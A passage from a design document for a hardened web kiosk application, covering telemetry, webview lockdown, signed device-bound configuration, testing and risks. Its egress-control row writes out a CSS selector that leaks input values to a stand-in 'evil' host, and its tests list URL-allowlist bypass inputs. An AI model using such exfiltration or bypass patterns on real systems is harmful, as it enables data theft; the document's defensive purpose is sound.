  refresh-and-retry. Token-endpoint failures (network/5xx/429) are handled like write
  failures (spool + backoff) and emit `token.error`. JWT `iat`/`exp` use trusted time
  (below). Per-flush minting is rejected (~8,640 calls/device/day otherwise).
- **Trusted time, NTP-independent (TEL-01).** The prober (§3.3) already GETs gstatic
  `generate_204` every 10–30 s; its `Date` response header is an authoritative UTC clock
  (verified live; RFC 9110 §6.6.1 mandates it), as are the OAuth and `entries:write`
  responses. `kiosk-core` maintains `time_offset = server_Date − local_clock`, refreshed
  on each prober success; `trusted_UTC = local + offset`. JWT `iat`/`exp` and entry
  timestamps use `trusted_UTC`, so a dead-CMOS/skewed device still mints tokens when NTP
  (UDP/123) is blocked on a 443-only kiosk LAN. When `|offset|` exceeds ~30 s (the JWT
  tolerance) emit `clock.skew` (WARNING). NTP stays the documented primary; this is the
  always-available fallback.
- **Resource & labels (TEL-04).** Monitored resource `generic_node` with **schema keys
  only**: `project_id`, `node_id={device_id}`, `namespace={site}`, `location={region}`
  (region from `kiosk.ini`, defaulting to `site` when unset). Non-schema identity —
  `app_version` (semver+git sha), `config_revision`, and redundantly `device_id`/`site`
  — goes in `LogEntry.labels`. Log name `projects/{project_id}/logs/kiosk`.
- **Timestamps (TEL-02).** Each entry is stamped at creation with `trusted_UTC` (RFC3339);
  the raw device clock is preserved in `jsonPayload.device_ts_raw`. Cloud Logging silently
  discards entries older than bucket retention (default 30 d) and rejects a batch with any
  timestamp > 24 h in the future (verified). On drain: (1) an entry created before trusted
  time existed is rewritten **once** using the current `time_offset` and persisted (retries
  must be byte-identical); if no offset, omit the timestamp so Logging assigns receive
  time. (2) Clamp any timestamp to `[now − retention + 1h, now]`. (3) Entries older than
  retention are dropped locally, incrementing `spool.dropped_expired` (surfaced in the
  next `health.sample`) — loss is visible, not silent.
- **Dedup/ordering (TEL-03).** Each entry gets `insertId = {device_id}-{seq}` at creation
  (`seq` = per-device monotonic counter persisted with the spool), written into the spool
  and reused verbatim on every retry. `insertId` is Cloud Logging's only dedup key and
  also orders same-`log_name`+timestamp entries; without it, ambiguous retries duplicate.
- **Batching (TEL-07/09).** Flush every 10 s or 100 entries, whichever first. On failure →
  disk spool split into two severity-tiered rings sharing `spool_max_mb` (JSONL, 5 MB
  segments): a protected WARNING/ERROR/CRITICAL ring sized `spool_reserve_high_mb`
  (default 10 of 50) and an INFO/DEBUG ring for the remainder; drop-oldest applies within
  each ring independently, so an INFO flood cannot evict diagnostics. Drain interleaves
  both rings by (timestamp, insertId), oldest-first. **Rate-limiting & coalescing:** each
  event type has a token-bucket cap (defaults: `nav.blocked`/`nav.error` 10/min burst 20;
  `webview.crash` 6/min); over-cap events are coalesced into one summary entry per window
  carrying the suppressed count + a sample — so a redirect/crash loop is signal, not a
  firehose.
- **Durability against SIGKILL/OOM (TEL-10).** A watchdog SIGKILL (§3.1) or OS OOM-kill
  runs neither the panic hook nor Drop, losing the in-memory batch. Therefore WARNING+
  entries are write-through to the spool with fsync at creation (the spool is the source
  of truth, the network a drain); the logger + heartbeat run on a thread independent of
  the (typically hung) webview thread and fsync on heartbeat-miss #2 (~10 s, before the
  15 s kill), with a ~1–2 s launcher flush grace; the launcher drains main's orphaned
  spool on restart.
- **URL redaction (TEL-08; §12/OD-7).** Every logged URL is reduced to
  `scheme://host/path` by default (query/fragment stripped) plus a truncated SHA-256
  (`url_sha256_8`) so distinct offenders stay distinguishable without exposing tokens/PII;
  `jsonPayload` uses an enumerated field allow-list (no free-form page content). Knob
  `logging.url_detail = path (default) | host | full`.
- **Volume budget.** Steady state ≈ 1,440 `health.sample` + a few hundred lifecycle
  entries ≈ ~1–2 MB/device/day; a 500-device fleet ≈ ~15–30 GiB/month, within the
  50 GiB/project free tier (then $0.50/GiB). Rate caps bound the worst case.

Severity is `DEBUG/INFO/WARNING/ERROR/CRITICAL`, assigned per event type (TEL-06 —
column below; a table-driven unit test asserts the mapping, §10).

Event taxonomy (`jsonPayload.event`):

| Event | Severity | When |
|---|---|---|
| `app.start` / `app.stop` | INFO | main lifecycle (includes version, uptime on stop) |
| `config.applied` | INFO | remote config accepted (revision, generation, `warnings[]`) |
| `config.error` | ERROR | remote config rejected (offending fields, reason) |
| `config.warn` | WARNING | field accepted but feature unavailable in this build (RT-08) |
| `config.reverted` | WARNING | post-apply self-check reverted to last-good (RT-04) |
| `net.online` / `net.offline` | INFO / WARNING | prober state flips (downtime duration on online) |
| `nav.error` / `nav.blocked` | WARNING | site load failure / allowlist or scheme violation |
| `webview.crash` | ERROR | renderer process died — auto-reload (P1 Win via ProcessFailed; WebKitGTK P2; Android P3) |
| `media.error` | WARNING | offline video failed to decode/play; fell back to static splash |
| `watchdog.restart` | ERROR | launcher restarted main (exit code, backoff, cause) |
| `watchdog.hang` | ERROR | webview hang detected (Win native P1; JS-ping P2) |
| `watchdog.channel_reset` | WARNING | heartbeat channel dropped/reconnected, child alive (no restart) |
| `watchdog.arm` | INFO | heartbeat enforcement armed after READY (time-to-ready) |
| `watchdog.safe_mode` | CRITICAL | crash-loop → safe mode (device degraded) |
| `watchdog.safe_mode_failed` | CRITICAL | N consecutive `--safe` starts crashed (suspected engine fault) |
| `focus.lost` | WARNING | kiosk window lost foreground (hardening event; reasserted) |
| `clock.skew` | WARNING | trusted-time offset exceeded ~30 s |
| `token.error` | WARNING | OAuth token mint/refresh failure |
| `health.sample` | INFO | CPU %, mem, disk free, uptime, webview RSS, `spool.dropped_expired` (P2) |
| `crash.panic` | CRITICAL | Rust panic hook: writes panic file, fsync spool; launcher attaches file to next `watchdog.restart` |

## 7. Webview hardening

The full control set ships with P1 on Windows; Linux and Android columns land with
their platform phases (P2, P3). **The document-start injection engine ships in P1**
(required by the injected controls below); P2 only exposes the operator-supplied
`inject_css`/`inject_js` knobs on top of it (RT-16).

| Control | Mechanism |
|---|---|
| Context menu off | WebView2 `AreDefaultContextMenusEnabled=false`; WebKitGTK `context-menu` signal; Android `setOnLongClickListener` consume + `contextmenu` JS preventDefault |
| DevTools off | per-webview settings; release builds compile without devtools feature |
| Zoom lock | WebView2 `IsZoomControlEnabled=false` **and `IsPinchZoomEnabled=false`** (pinch is a separate Page-Scale zoom — WebView2Feedback #459); WebKitGTK fixed `zoom-level` — note this fixes only base zoom, interactive pinch is GTK-owned and needs a gesture-controller intercept in the platform layer / a wry patch, validated on touch hardware in P2 (wry #544, PF-04); Android `setSupportZoom(false)` + `setBuiltInZoomControls(false)`. `content.zoom` sets fixed factor. Injected `touch-action: pan-x pan-y` CSS is belt-and-suspenders only (page-overridable) |
| Text selection off | injected `* { user-select: none }` with `input, textarea { user-select: text }` (config flag) |
| Drag/drop off | injected `dragstart`/`drop` preventDefault + platform drop-target disable |
| Printing off (H1) | inject at document-start `Object.defineProperty(window,"print",{value:()=>{},writable:false,configurable:false})`; **Ctrl+P** in the §7.2 swallow list; WebView2 has no API to disable printing (WebView2Feedback #3545/#42/#2638), so both entry points are removed; WebKitGTK `print` signal returns TRUE; Android exposes no print UI unless wired (we don't) |
| Script dialogs (M3) | see §3.6 — default dialogs off, `beforeunload` auto-dismissed, `alert/confirm/prompt` rate-limited |
| Autofill / saved data off (M5) | WebView2 `IsGeneralAutofillEnabled=false` (default true — stores names/addresses/emails in the Web-Data store, outside cookies), pin `IsPasswordAutosaveEnabled`/`IsPasswordAutofillEnabled=false`; WebKitGTK disable form persistence; Android `setSaveFormData(false)` + `clearFormData()` |
| Web permissions (default-deny, M9) | WebView2 handle `PermissionRequested` → Deny (camera/mic/geolocation/notifications/clipboard-read/MIDI) unless in `content.permissions`; WebKitGTK `permission-request` deny; Android `onPermissionRequest`/`onGeolocationPermissionsShowPrompt` deny |
| Media autoplay | Android: `setMediaPlaybackRequiresUserGesture(false)` in the Kotlin plugin (required — default blocks autoplay); WebView2/WebKitGTK: muted autoplay allowed by default |
| Shortcut blocking | **Windows: PRIMARY = WebView2 `CoreWebView2Controller.AcceleratorKeyPressed` (`Handled=true`) for accelerator keys the webview receives (Ctrl+W, Ctrl+P, Ctrl+N, Ctrl+T, F5, F11, …). Global chords the webview never sees (Alt+F4, Alt+Tab, bare Win, Ctrl+Esc, Ctrl+Shift+Esc) need a `WH_KEYBOARD_LL` hook — BUT this hook is documented not to fire while the WebView2 window is focused (Tauri #13919) and is silently dropped past the 1000 ms `LowLevelHooksTimeout` during a UI hang, so it is best-effort defense-in-depth only, on a dedicated pump-isolated thread. It is NOT a security boundary; OS-level Assigned Access / Shell Launcher is the covering boundary (§7.2, §12/OD-5). Explicit swallow list: Alt+F4, Alt+Tab, Alt+Esc, Ctrl+Esc, Ctrl+Shift+Esc, all Win combos, Ctrl+W/Shift+W/N/Shift+N/T/P, F11, App/Menu key. OS-reserved chords (Win+L, Win+G, Win+K, Win+Alt+R, Ctrl+Alt+Del) cannot be swallowed and are closed only at the OS layer (§7.2, PF-03).** Linux: compositor owns keys — cage session has none; VT switching (Ctrl+Alt+F1–F7) and Ctrl+Alt+Backspace are kernel/logind-level, closed via §7.2. Android: Lock Task Mode (device-owner). |
| Cursor auto-hide | injected JS: `cursor: none` after `cursor_autohide_seconds` idle, restore on move |
| Keep-awake | Windows `SetThreadExecutionState` (inhibits sleep/display-off, NOT the lock screen — see §7.2/M8); Linux/Wayland: `systemd-inhibit` blocks *suspend* only, display blanking is compositor-owned — PRIMARY is configuring cage/wlroots not to blank (idle-inhibit is secondary and only if wry exposes an inhibitor surface; validated in P2, PF-07); Android `FLAG_KEEP_SCREEN_ON` |
| Text selection ActionMode (Android, M7) | override `setCustomSelectionActionModeCallback` (+ process-text) to return an empty ActionMode — the selection floating toolbar (Web-search/Assist/Share/Translate launch external apps) is a distinct mechanism `setOnLongClickListener` does not suppress |
| Touch keyboard | Android: system IME. **Windows: TabTip does NOT reliably auto-invoke on webview input focus (WebView2Feedback #1887/#460), so P1 ships an explicit TabTip driver OR the bundled JS on-screen keyboard, validated on touch hardware under Assigned Access (PF-02, §12/OD-1).** Linux: squeekboard/onboard deployment docs |
| Downloads / popups / file pickers | blocked; new windows navigate in place; file picker allowed only via config flag (future) |
| PDF (M4; §12/OD-8) | default: navigations returning `application/pdf` are **blocked** (`nav.blocked`) — the Edge PDF viewer toolbar exposes Print/Save that bypass `DownloadStarting`. `content.pdf_view=true` routes PDFs through a bundled chrome-less pdf.js viewer instead. Confirm interceptors wired per platform (WebView2 `DownloadStarting`, WebKitGTK `download-started`, Android `setDownloadListener`) |
| Egress containment (SEC-10) | Native subresource host-allowlist: **every** resource request (not just navigations) checked against `content.allowlist` and cancelled if off-list — WebView2 `WebResourceRequested`, WebKitGTK `resource-load-started`, Android `shouldInterceptRequest` — plus an injected restrictive CSP. Closes CSS/JS exfiltration (e.g. `input[value^="a"]{background:url(https://evil/a)}`, `fetch`, beacon) that never triggers a navigation. Residual gaps (service workers, some preload paths) documented |

### 7.2 OS-level hardening (deployment gate, per platform)

The app cannot enforce OS security boundaries; these are provisioning-time requirements
shipped as `packaging/<os>` docs and referenced from §7/§8/§11. A device not meeting its
baseline is **not** a secure kiosk (§1 goal wording; RT-11/RT-12/RT-15).

- **Windows.** Assigned Access or Shell Launcher (replaces `explorer.exe` — requires
  Windows Enterprise/IoT/Education; Pro/Home cannot use Shell Launcher, PF-01/SEC-07,
  §12/OD-5) as the covering lockdown; GPO/registry disabling Task Manager, Run, and
  registry tools; disable Sticky Keys (5×Shift), Filter Keys, Toggle Keys accessibility
  hotkeys; `DisableLockWorkstation`, "Turn off Windows Key hotkeys", disable Xbox Game
  Bar (H4/PF-03). **Autologon** to a locked, unprivileged kiosk local account; disable/
  secure the screensaver via policy; Windows Update **active hours + reboot deferral** +
  reboot-into-kiosk (autologon + Startup) — else a forced WU reboot lands on the lock
  screen and the in-app watchdog never starts (M8).
- **Linux.** cage (Wayland) locked session as the supported secure config (X11/openbox is
  documented but NOT app-enforced — demo only). Disable VT switching and zap: logind
  `NAutoVTs=0`/`ReserveVT=0` (or X11 `DontVTSwitch`/`DontZap`); run on a dedicated seat
  with no other TTYs; disable DPMS/screensaver in the cage session; mask sleep/suspend
  targets (H5/PF-07/M8).
- **Android.** Device-owner provisioning (QR/zero-touch) is required for a secure kiosk;
  a device-owner system-update policy schedules updates in a window; screen pinning is
  demo-only (H3/RT-15).

## 8. Security

- **Device identity & credential (SEC-03; §12/OD-2).** Kiosks are physically hostile; a
  shared long-lived key is fleet-wide compromise on a single theft, with no single-device
  revocation. **Target architecture:** a token-proxy — each device authenticates with a
  per-device credential (client cert / device key) and receives a short-lived, downscoped
  token (or signed URL) for only its own config object plus a `logging.logWriter` token;
  no long-lived GCP key on device. **Interim (pilot/small fleets only):** a per-device
  service account (enables single-device revocation; note GCP's default limit of ~100
  service accounts/project makes per-device SAs impractical beyond ~100 devices). A single
  shared service account is not acceptable for production. Per-device credential rotation
  is a documented operational procedure (revoke + re-provision); the token-proxy makes
  rotation automatic via short-lived tokens.
- **Credential at rest (SEC-09).** Stored in the OS keystore, not a flat file (Windows
  DPAPI/Credential Manager, Linux kernel keyring or `root:root 0600`, Android Keystore).
  Permissions are enforced **fail-closed**: the installer sets an owner-only ACL/mode
  (WiX `util:PermissionEx`); at boot AND on every config reload, if the credential lacks
  its required restrictive mode the device refuses to load it and enters safe mode (last-
  good display, spooled `config.error`) rather than only logging. Note
  `C:\Program Files\kiosk\` is world-readable by default — the installer MUST tighten it.
- **Config read scoping (SEC-04).** Bucket-level `roles/storage.objectViewer` grants read
  to every object in the bucket, exposing every device config and exit-secret hash to any
  single credential. Instead bind the per-device principal with an IAM Condition
  (`resource.name.startsWith(".../objects/devices/<device_id>")`, requires uniform
  bucket-level access), or issue per-device downscoped tokens via the proxy. No secrets
  live in fleet-readable objects.
- **Config integrity — shipped, not future (SEC-11; §12/OD-3).** GCS IAM is access
  control, not authenticity — any principal with bucket write (CI/CD, Terraform, admin
  laptop, mis-set IAM, compromised GCS SA) can push attacker content and the device
  trusts it over TLS. Config is **signed** (detached Ed25519 over the **RFC 8785 JCS
  canonicalization** of the config object with the `sig` field removed) and verified
  on-device with a **pinned public key baked into the signed binary** (a key NOT
  co-located with the read credential). Every remotely-fetched config MUST carry `sig` +
  `device_id` + `revision`; validation order is signature → **device binding** →
  anti-rollback → schema (§5.2), and unsigned / invalid-signature / wrong-device / stale
  configs are rejected (keep last-good). `revision` is a monotonically increasing integer
  inside the signed payload; the device persists the last-applied revision and rejects any
  config with `revision ≤ last-applied` (anti-rollback/replay). Locally-sourced config is
  exempt from signature/binding/rollback (the `[bootstrap]` url has no remote body);
  `config-lastgood.json` is **not** — it re-clears signature + device binding at every boot.
  This gates `inject_js` (SEC-01) and `config_url` repointing (SEC-08). **Ships in P1.**
- **Device binding (SEC-11).** A signature proves a document is *genuine*; it does not
  prove it was authored for *this* device. Every fetched config therefore carries
  `device_id` **inside the signed payload**, and the device rejects the whole document
  unless it equals its own effective device_id. Without this, a signature is a fleet-wide
  bearer token: the read credential can enumerate **every** device's config object
  (SEC-04), so anyone who can influence which object a device fetches — a repointed
  `config_url` (SEC-08), a MITM, a stale/replayed object, a redirect — can serve kiosk A
  the genuinely-signed, **higher-revision** config of kiosk B. It would pass signature
  verification (it *is* validly signed), pass anti-rollback (B's revision is higher), pass
  schema validation, and be **adopted** — handing kiosk A kiosk B's `content.url` and
  `inject_js` (arbitrary code execution, SEC-01) with **no forgery and bucket READ alone**.
  Binding is **required from day one** (fail closed — nothing is deployed, so there is no
  fleet to migrate), and is enforced on the fetch path *and* on the boot/last-good path
  (otherwise the hole simply moves to the store: plant another device's genuinely-signed
  config in the data dir). A device-binding failure is reported as its own `config.error`
  reason, distinct from a signature or rollback failure.
- **Residual, known-open: the anti-rollback floor is disk-derived (SEC-11/SEC-09).** The
  floor is seeded from `config-lastgood.json`. A running process holds it in memory (so
  deleting/truncating the store cannot collapse the floor of a *running* kiosk), but an
  attacker with **write access to the data dir** can truncate or delete that file and force
  a reboot: the floor is then re-seeded as 0 and an **older, correctly-bound, correctly
  signed** config can be replayed. This is inherent to a disk-only floor — no software
  layer above the disk can fix it — and it is **not addressed by this design**; it is
  recorded here rather than left implicit. Mitigation is OS-layer: a restrictive ACL on the
  data dir plus the boot/physical prerequisites of §7.2/SEC-09/SEC-08. A monotonic
  hardware/TPM counter would close it and is out of scope for v1.
- **Remote code execution surface (SEC-01).** Because `content.inject_js`/`inject_css`
  execute in the page's own JavaScript world on the trusted content origin (Tauri
  `initialization_script`), bucket write is *arbitrary code execution* on every kiosk,
  not URL control: injected code inherits the logged-in kiosk cookies/session, can make
  authenticated requests, and exfiltrate. Because every fetched config is
  signature-verified (SEC-11), injection is honoured only from an authenticated config;
  a build without working signature verification (predating signed-config support) MUST
  reject non-empty `inject_js`/`inject_css`. Egress is further bounded by the §7
  subresource allowlist + CSP.
- **Physical & boot prerequisites (SEC-08).** OS file ACLs are bypassed by USB/PXE boot
  or disk removal. Deployment MUST enable full-disk encryption (BitLocker/LUKS/Android
  FBE), a BIOS/UEFI supervisor password, Secure Boot, and disabled USB and network (PXE)
  boot. Without these, an attacker reads `kiosk-credential.json` and rewrites `kiosk.ini`
  `config_url` to an attacker server — single-device takeover with no bucket access.
  Signed config + the Secure-Boot-protected pinned key make a repointed `config_url` yield
  **forged** configs that fail verification and fall back to last-good. That alone does
  **not** defeat *replay of another device's genuinely-signed config*: with bucket read
  (SEC-04) — or any stale/redirected object — a repointed `config_url` can serve a config
  that is validly signed, merely authored for a different kiosk, and it would verify. What
  closes that is **device binding** (SEC-11): the signed payload names the device it is for,
  and a mismatch rejects the whole document.
- **Remote origins** get no Tauri IPC and no navigation-sentinel bridge: idle reset and
  exit gesture are native (§3.5), so page content cannot trigger native actions;
  `kiosk://` navigations from a remote origin are logged and blocked.
- **Exit secret (SEC-05).** argon2id does not rescue a 4-digit PIN (10⁴ candidates crack
  in minutes offline once the hash leaks; a fleet-shared PIN then unlocks every kiosk).
  Therefore: the hash is never fleet-readable (per-device, read-scoped) and per-device; the
  PIN pad enforces on-device attempt lockout with exponential backoff persisted across
  restarts (stored in the data dir); a longer alphanumeric secret or hardware token is
  supported for higher-assurance sites. `pin_hash` is a PHC string
  (`$argon2id$v=19$m=...,t=...,p=...$<b64 salt>$<b64 hash>`, cfg-04).
- **Navigation allowlist** enforced natively (not in JS), main-frame scoped, in the pure
  `kiosk-core/nav` matcher (§3.6); the idle-reset privacy control is also native (§3.5),
  so page content cannot neutralize it.
- **OS-protected hotkeys** (Win+L/G/K, Ctrl+Alt+Del, VT switch, screen-pinning escape)
  are outside in-app control; the §7.2 baseline closes them and platform-floor notes flag
  where a SKU (Windows Home) cannot apply them (PF-03).
- `dist-template/kiosk-credential.json` is an obviously-fake placeholder; `.gitignore`
  blocks real credentials.

## 9. Roadmap

| Phase | Deliverable | Contents |
|---|---|---|
| **P0** | skeleton | workspace, Tauri app boots fullscreen with hardcoded URL on Windows, CI builds Windows (release) + Linux (compile check). **P0 gate (PF-01):** demonstrate that `AcceleratorKeyPressed` and/or `WH_KEYBOARD_LL` actually swallow Alt+Tab / Alt+F4 / Ctrl+W inside a focused fullscreen Tauri/WebView2 window (Tauri #13919); also confirm native pointer/touch tap-capture works over the focused webview (exit-gesture dependency, §3.5); if neither holds, Assigned Access / Shell Launcher becomes a P1 requirement |
| **P1** | Windows MVP — deployable | kiosk.ini, hardening set (§7) incl. injection engine + printing/permissions/autofill/pinch/script-dialog controls, **exit gesture + native PIN pad (emits exit code 86)**, offline video + connectivity FSM + decode-failure fallback, remote config cycle (whole-doc validation, bounds, versioning, self-check), **signed config + device binding + anti-rollback**, GCL client + trusted time + insertId + tiered spool + rate-limits, launcher watchdog + heartbeat (process liveness) + READY arming + safe mode + escalation, **renderer hang + crash recovery (`CoreWebView2.ProcessFailed`: `RenderProcessUnresponsive`→reload, `RenderProcessExited`→recreate)**, **nightly reload**, WiX MSI (**Authenticode-signed**, credential ACL) with WebView2 bootstrap, **touch text entry validated on touch hardware**, splash/error/pinpad pages, §7.2 Windows OS-lockdown docs |
| **P2** | Linux + robustness | WebKitGTK parity (incl. pinch-gesture intercept, keep-awake at compositor), .deb + systemd + cage docs + §7.2 Linux hardening, idle reset (native), **memory cap restart + health-sampled RSS**, cross-platform webview-hang detection (JS ping), config-driven `inject_css`/`inject_js` knobs (behind signed config), remote log level, restart_app |
| **P3** | Android | Tauri android target, Kotlin plugin (Lock Task/device-owner fail-closed, foreground service + `foregroundServiceType`, boot receiver, keep-screen-on, `setMediaPlaybackRequiresUserGesture`, ActionMode override, `with_webview` JNI settings), in-process watchdog + in-app crash-loop/safe-mode, APK + device-owner provisioning docs. **Early P3 spike:** confirm `with_webview` JNI can mutate WebSettings / attach listeners |
| **P4** | fleet niceties | auto-update — **Windows/Linux only** (launcher performs staged, signed binary swap; Android updates via MDM/Play per §1 non-goal), one-shot remote commands (reload/clear-cache/screenshot, executed-ID dedup), automated staged/canary config rollout, URL playlist rotation, display on/off schedule, Cloud Monitoring dashboard + log-based-metrics docs |

Platform floors: Windows 10 1809+ / Windows 11 (incl. IoT); **robust lockdown (Assigned
Access / Shell Launcher) requires Enterprise/IoT/Education — Pro is insufficient** (SEC-07).
Ubuntu 22.04 / Debian 12 (webkit2gtk-4.1, X11 or Wayland; **cage required for secure
lockdown**). Android 8.0 (API 26)+; **unattended/secure = device-owner provisioned**
(screen pinning is attended/demo only, arch-11/H3/RT-15).

## 10. Testing

- `kiosk-core`: TDD, pure unit tests — config parse/validate/last-good, **numeric-bounds
  and version-compat rejection**, prober FSM transitions (damping), spool rotation/drain +
  tiered eviction + insertId dedup, JWT signing against fixtures, trusted-time offset,
  heartbeat protocol, and the **URL allowlist/glob matcher with adversarial tests**
  (host-suffix `app.example.com.evil.com`, userinfo `...@evil.com`, scheme downgrade,
  path traversal, embedded-URL in query, IDN/punycode, default-deny on parse failure —
  RT-03), plus an **event→severity table-driven test** (TEL-06/RT-09).
- **JWT contract test (offline, always-on):** assert the exact header and claim set
  (RS256; `iss`=client_email; `scope` contains `logging.write` [+ `devstorage.read_only`];
  `aud`=token_uri; `exp−iat ≤ 3600`) against Google's server-to-server requirements, so a
  typo'd `aud`/`scope` fails CI, not production. Asserts the interim-SA scope set
  (`logging.write` [+ `devstorage.read_only`]); the SEC-03 token-proxy target issues a
  logging-only token, so the test is parameterised by credential model, not hard-coded
  (RT-09).
- Integration: fake GCL server + fake config server (local HTTP). Launcher↔main restart
  cycle driven by a mock main; **plus an end-to-end watchdog test with a real (headless)
  kiosk-main** — real heartbeat client + state machine + launcher, only the webview
  replaced by a scriptable stub — exercising heartbeat-timeout restart, hang→restart,
  renderer-crash→reload, and clean exit-86 (RT-13).
- **Soak/endurance (scheduled CI, not per-PR):** a Windows-runner job drives looped
  navigation + a deliberately leaking page with accelerated thresholds; asserts bounded
  RSS, that a `max_webview_mem_mb` breach fires a restart, and that nightly reload resets
  RSS. A ≥72 h real-hardware soak is a pre-release gate (RT-05). **Offline-video soak:**
  multi-hour loop on the pinned Debian 12 image, assert no stall/black frame across loop
  boundaries (PF-05).
- **Live token-exchange smoke (gated/opt-in, release gate):** a real RS256 → oauth2 token
  exchange + one `entries:write` against a throwaway service account; skipped when creds
  absent (RT-09).
- Webview/UI layer stays thin; per-platform manual smoke checklist in `docs/testing.md`
  (hardening set incl. the escape vectors in §7.2, video loop, reconnect, watchdog kill
  test).
- CI: `cargo fmt --check`, `cargo clippy -D warnings`, `cargo test`, release build Windows
  (P0) + Linux compile check (P0 → functional at P2), Android build (P3), Authenticode
  signing step (unsigned artifacts fail the release gate).

## 11. Risks

| Risk | Mitigation |
|---|---|
| Tauri Android maturity | Android scheduled last (P3); core stays framework-independent; P3 spike confirms `with_webview` JNI WebSettings mutation; JS/CSS hardening is the primary native-access-free path |
| Keyboard hook blind on focused WebView2 (Tauri #13919) | `AcceleratorKeyPressed` primary; P0 spike proves swallowing; OS-level Assigned Access / Shell Launcher as covering boundary |
| Windows TabTip does not auto-invoke in WebView2 (#1887) | P1 ships explicit TabTip driver OR bundled JS keyboard; validated on touch hardware in Assigned Access |
| WebKitGTK H.264 loop deps + seek-loop fragility (#1062012) | name exact gst packages in .deb; multi-hour loop soak on target image; fallback = seamless no-seek loop or native GL path |
| WebKitGTK pinch-zoom not suppressible via zoom-level (wry #544) | P2 intercepts the GTK zoom gesture in the platform layer / upstreams a wry hook; validate on touch hardware |
| keep_awake blocks suspend but not display blanking on Wayland/cage | P2 disables blanking at the compositor (cage/wlroots) as primary; confirm cage honours idle-inhibit before relying on it |
| Android 14+ FGS-from-boot restriction / mandatory FGS type | declare `foregroundServiceType`; device-owner required for unattended boot-autostart; screen-pinning fallback best-effort on API 34+ |
| Non-device-owner Android can't relaunch UI after OOM | require device-owner for unattended; screen-pinning attended-only |
| WebView2 runtime missing on older Win10 | MSI bootstraps evergreen installer |
| Broken/partial WebView2 after bad evergreen update fails `--safe` too | bounded safe-mode escalation + `watchdog.safe_mode_failed` CRITICAL; engine repair via auto-update (P4) or MDM |
| Webview memory leaks over weeks | P1 nightly reload; P2 adds memory-cap restart + health-sampled RSS; validated by scheduled soak (§10) |
| Clock skew breaks GCL JWT | trusted-time offset from gstatic/OAuth HTTP `Date` clamps JWT `iat`/`exp` so tokens mint without NTP; `clock.skew` WARNING; spool+retry backstop; NTP still documented |
| Spooled telemetry silently discarded (skew / long outage past retention) | timestamp rewrite/clamp at drain; `spool.dropped_expired` surfaced; insertId prevents retry duplicates |
| Unsigned config = fleet takeover by any bucket-write principal | signed config (Ed25519) + pinned key + monotonic revision anti-rollback, shipped P1 |
| Replay of another device's *genuinely-signed* config (bucket READ + repointed `config_url`/MITM/stale object is enough — no forgery) | **device binding**: `device_id` inside the signed payload must equal the device's effective device_id; checked right after the signature, on the fetch AND boot/last-good paths (SEC-11) |
| Rollback floor reset by truncating `config-lastgood.json` + forcing a reboot ⇒ replay of an older correctly-signed, correctly-bound config | **known-open, accepted for v1** (a disk-only floor cannot defend itself). OS-layer mitigation: restrictive data-dir ACL (§7.2/SEC-09) + boot prerequisites (SEC-08); a TPM monotonic counter would close it |
| `inject_js`/`inject_css` = RCE on every device | rejected unless config signed; egress bounded by subresource allowlist + CSP |
| Single stolen device exposes the fleet (shared SA key + bucket-wide read + PIN hash) | keystore at-rest storage; per-object IAM condition; per-device credentials/token-proxy; PIN hash off shared-readable config |
| Physical boot / disk pull bypasses OS ACLs | FDE + UEFI password + Secure Boot + USB/PXE-boot disabled as hard prerequisites; signed config + pinned key resist `config_url` repointing |
| Bad-but-valid config push bricks the whole fleet | post-apply reachability self-check with auto-revert + documented canary practice; automated staged rollout = P4 |
| Kiosk escape via OS boundaries / misconfig (Ctrl+Alt+Del→Task Manager, X11 unlocked, non-owner pinning) | mandatory §7.2 OS-lockdown checklist as a deployment gate; boot-time telemetry self-check where detectable |
| WU/forced reboot lands on the lock screen → kiosk down | autologon + active hours + reboot-into-kiosk (§7.2) |
| Unsigned MSI blocked by SmartScreen/enterprise GPO | Authenticode-signed installer + PE binaries (P1); enterprise trusted-intranet deployment sidesteps reputation build-up |

## 12. Open questions & owner decisions

These are genuine product/scope decisions surfaced by the review that evidence cannot
settle. Each lists the options, the review's recommendation, and (where applicable) the
safe default already applied in the body above (marked "applied"). The owner may override
any of them.

| ID | Decision | Options | Recommendation |
|---|---|---|---|
| OD-1 | **P1 scope: truly "deployable/unattended" vs "attended pilot"** (arch-04, RT-01/02/06, PF-02, RT-18, SEC-11) | (a) pull hang recovery, renderer-crash reload, native exit gesture, nightly reload, touch text entry, MSI + config signing into P1 (applied); (b) relabel P1 "attended pilot" and defer some to P2 | **(a)** — the near-free items (ProcessFailed hang/crash, nightly reload, native exit, signing) close field-failure and field-service gaps a "deployable" MVP must not ship without |
| OD-2 | **Device credential architecture** (SEC-03/04, RT-10) | token-proxy (no on-device key; prod); per-device SA (≤~100 devices); shared key (rejected for prod) | **token-proxy for production; per-device SA for pilots ≤100.** Interim wins applied now: keystore storage, per-object IAM condition, PIN hash off shared bucket |
| OD-3 | **Ship `inject_js`/`inject_css` in v1 at all?** (SEC-01) | (a) keep, gated behind signed config (applied); (b) drop from v1 | **(a)** — retains per-device tweaks while validation rejects unsigned injection; requires signed config (OD-1/SEC-11) |
| OD-4 | **Android secure baseline** (arch-11, H3, RT-15) | (a) require device-owner for secure/unattended, screen-pinning = `demo_mode` only, fail-closed otherwise (applied); (b) support non-owner unattended | **(a)** — screen pinning is a trivial user-exitable bypass; non-owner cannot reliably relaunch after OOM |
| OD-5 | **Windows lockdown SKU** (PF-01/03, SEC-07, M8) | (a) mandate Assigned Access/Shell Launcher (Enterprise/IoT/Education) as covering boundary, in-app hook = defense-in-depth (applied); (b) rely on in-app hook only | **(a)** — the in-app hook is documented-unreliable on focused WebView2 and cannot block OS-reserved chords; procurement must target these SKUs |
| OD-6 | **Config-safety UX** (cfg-02, cfg-05, RT-04) | implicit-allow home URL vs reject-if-mismatch; `content.url` falls back to bootstrap vs required; post-apply self-check + manual canary now vs automated canary system | **implicit-allow home URL, fallback-to-bootstrap, self-check + manual canary now (applied); automated staged rollout = P4** |
| OD-7 | **Telemetry modelling** (TEL-04, TEL-08) | `generic_node.location` = new `region` field vs reuse `site`; URL redaction default = path / host / full | **add optional `region` (default site); URL redaction default = path-only** (applied) — privacy-first fits shared-kiosk stance + data-protection law |
| OD-8 | **PDF policy** (M4) | block `application/pdf` by default vs render via bundled pdf.js | **block by default, `content.pdf_view=true` opt-in** (applied) — the Edge PDF viewer's Print/Save bypass download blocking |
